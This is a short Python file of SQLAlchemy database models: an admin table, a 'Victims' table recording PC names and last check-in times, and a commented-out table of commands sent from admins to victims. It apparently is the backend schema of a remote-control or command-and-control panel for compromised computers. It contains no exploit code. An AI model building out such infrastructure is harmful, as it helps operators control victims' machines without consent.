from sqlalchemy import Column
from sqlalchemy import Integer, String, DateTime, Float, Boolean

from .db_config import Base


class Admin(Base):
    __tablename__ = "admins"
    id = Column(Integer, autoincrement=True, index=True, primary_key=True)
    admin_login = Column(String)
    admin_hash_password = Column(String)
    is_super_admin = Column(Boolean, default=False)
    is_active = Column(Boolean, default=True)
    who_create = Column(String, default=None)


class Victim(Base):
    __tablename__ = "Victims"
    id = Column(Integer, autoincrement=True, primary_key=True, index=True)
    pc_name = Column(String)
    unique_number = Column(String, unique=True, default=None)
    last_login_date = Column(DateTime)
    last_login_time = Column(Float)


# class Command(Base):
#     __tablename__ = "Commands"
#     id_admin = Column(Integer, nullable=False, unique=True)
#     id_victm = Column(Integer, primary_key=True, nullable=False, unique=True)
#     command = Column(String, nullable=False)



